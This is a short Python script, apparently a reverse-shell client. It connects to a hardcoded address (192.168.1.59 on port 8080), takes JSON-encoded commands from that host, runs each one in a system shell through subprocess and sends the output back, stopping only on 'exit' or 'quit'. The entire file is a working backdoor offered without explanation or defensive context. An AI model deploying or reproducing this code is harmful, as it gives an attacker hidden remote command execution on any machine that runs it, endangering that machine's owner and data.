import json
import socket
import subprocess

class connectionSocket:
    def __init__(self,host,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((host, port))


    def command_interaction(self,command):
         return subprocess.check_output(command, shell=True)

    def json_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data)


    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data +self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def listening(self):
        while True:
            command = self.json_recv()

            if command[0] == "exit":
                self.connection.close()
                exit()

            if command[0] == "quit":
                self.connection.close()
                exit()

            command_output = self.command_interaction(command)
            self.json_send(command_output)
        self.connection.close()

socket_obj = connectionSocket("192.168.1.59",8080)
socket_obj.listening()
